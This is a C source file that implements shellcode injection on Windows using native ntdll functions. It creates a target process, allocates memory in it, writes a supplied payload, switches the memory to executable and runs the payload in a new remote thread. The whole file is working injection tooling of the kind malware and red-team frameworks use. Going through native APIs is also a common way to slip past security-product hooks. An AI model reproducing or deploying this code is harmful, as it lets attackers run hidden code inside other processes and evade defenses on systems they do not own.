#include "NativeApiInjection.h"

BOOL CreateTargetProcess
(
	_In_ LPCWSTR TargetProcessPath,
	_Out_ HANDLE* ProcessHandle,
	_Out_ HANDLE* ThreadHandle
)
{

	STARTUPINFOW si = { 0 };
	PROCESS_INFORMATION pi = { 0 };

	RtlSecureZeroMemory(&si, sizeof(STARTUPINFOW));
	RtlSecureZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
	si.cb = sizeof(STARTUPINFOW);

	if (!CreateProcessW(TargetProcessPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
	{
		WARN("Failed To Create Process: %ls", TargetProcessPath);
		PRINT_ERROR("CreateProcessW");
		return FALSE; // no point of continuing if we can't even create the process
	}

	INFO("[0x%p] Process Handle", pi.hProcess);
	INFO("\t\t\t\\___ [%ld] ProcessId", pi.dwProcessId);
	INFO("[0x%p] Thread Handle", pi.hThread);
	INFO("\t\t\t\\___ [%ld] ThreadId", pi.dwThreadId);

	*ProcessHandle = pi.hProcess;
	*ThreadHandle = pi.hThread;

	return TRUE;

}

BOOL NativeApiInjection
(
	_In_ PVOID Payload,
	_In_ SIZE_T PayloadSize,
	_In_ HANDLE ProcessHandle,
	_In_ HANDLE ThreadHandle
)
{

	NTSTATUS Status			= STATUS_SUCCESS;
	BOOL State				= TRUE;
	PVOID PayloadBuffer		= NULL;
	HMODULE Ntdll			= NULL;
	OBJECT_ATTRIBUTES OA	= { 0 };
	DWORD dwOldProtection	= 0;
	SIZE_T BytesWritten		= 0;
	SIZE_T RegionSize = PayloadSize;

	RtlSecureZeroMemory(&OA, sizeof(OBJECT_ATTRIBUTES));
	OA.Length = sizeof(OBJECT_ATTRIBUTES);

	if (!(Ntdll = GetModuleHandleW(L"Ntdll.dll")) || Ntdll == NULL)
	{
		WARN("Failed To Get a Handle to Ntdll.dll!");
		PRINT_ERROR("GetModuleHandleW");
		return FALSE; // no point of continuing
	}

	LOADAPI(fn_NtCreateThreadEx,		Ntdll, NtCreateThreadEx			);		/*>> Create a New Thread Pointing to Newly Allocated Buffer */
	LOADAPI(fn_NtAllocateVirtualMemory, Ntdll, NtAllocateVirtualMemory	);		/*>> Allocate a Block of Virtual Memory to a Process		*/
	LOADAPI(fn_NtProtectVirtualMemory,	Ntdll, NtProtectVirtualMemory	);		/*>> Change Memory Protections of Respective Memory Block	*/
	LOADAPI(fn_NtWriteVirtualMemory,	Ntdll, NtWriteVirtualMemory		);		/*>> Write a Block of Virtual Memory to a Process			*/
	LOADAPI(fn_NtFreeVirtualMemory,		Ntdll, NtFreeVirtualMemory		);		/*>> Free Virtual Memory									*/
	LOADAPI(fn_NtWaitForSingleObject,	Ntdll, NtWaitForSingleObject	);		/*>> Wait For Thread To Finish								*/

	if (!NT_SUCCESS(Status = NtAllocateVirtualMemory(ProcessHandle, &PayloadBuffer, 0, &PayloadSize, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE)))
	{
		WARN("Failed To Allocate %zu Bytes To Target Process!", PayloadSize);
		NTERROR("NtAllocateVirtualMemory", Status);
		State = FALSE; goto _END_FUNC;
	}

	INFO("Allocated %zu Bytes To Target Process!", PayloadSize);
	INFO("[0x%p] Payload Buffer Address", PayloadBuffer);

	if (!NT_SUCCESS(Status = NtWriteVirtualMemory(ProcessHandle, PayloadBuffer, Payload, RegionSize, &BytesWritten)))
	{
		WARN("Failed To Write %zu Bytes To Target Process!", PayloadSize);
		NTERROR("NtWriteVirtualMemory", Status);
		State = FALSE; goto _END_FUNC;
	}

	INFO("Successfully Wrote %zu Bytes to Target Process!", BytesWritten);
	INFO("[0x%p] Payload Address", Payload);

	if (!NT_SUCCESS(Status = NtProtectVirtualMemory(ProcessHandle, &PayloadBuffer, &PayloadSize, PAGE_EXECUTE_READ, &dwOldProtection)))
	{
		WARN("Failed To Change Memory Protection!");
		NTERROR("NtProtectVirtualMemory", Status);
		State = FALSE; goto _END_FUNC;
	}

	INFO("Changed Memory Protections! PAGE_READWRITE --> PAGE_EXECUTE_READ");

	if (!NT_SUCCESS(Status = NtCreateThreadEx(&ThreadHandle, THREAD_ALL_ACCESS, &OA, ProcessHandle, PayloadBuffer, NULL, 0, 0, 0, 0, NULL)))
	{
		WARN("Failed To Create a New Thread!");
		NTERROR("NtCreateThreadEx", Status);
		State = FALSE; goto _END_FUNC;
	}

	INFO("[0x%p] New Thread Created Pointing To Our Payload!", ThreadHandle);
	INFO("Wait For Thread To Finish Executing...");

	if (!NT_SUCCESS(Status = NtWaitForSingleObject(ThreadHandle, FALSE, NULL)))
	{
		WARN("Thread Failed To Finish Executing!");
		NTERROR("NtWaitForSingleObject", Status);
		State = FALSE; goto _END_FUNC;
	}

	OKAY("DONE!");

_END_FUNC:

	if (PayloadBuffer)
		if (!NT_SUCCESS(Status = NtFreeVirtualMemory(ProcessHandle, &PayloadBuffer, &PayloadSize, MEM_RELEASE)))
			WARN("Failed To Release Virtual Memory!");

	if (ProcessHandle)
		CloseHandle(ProcessHandle);

	if (ThreadHandle)
		CloseHandle(ThreadHandle);

	return State;

}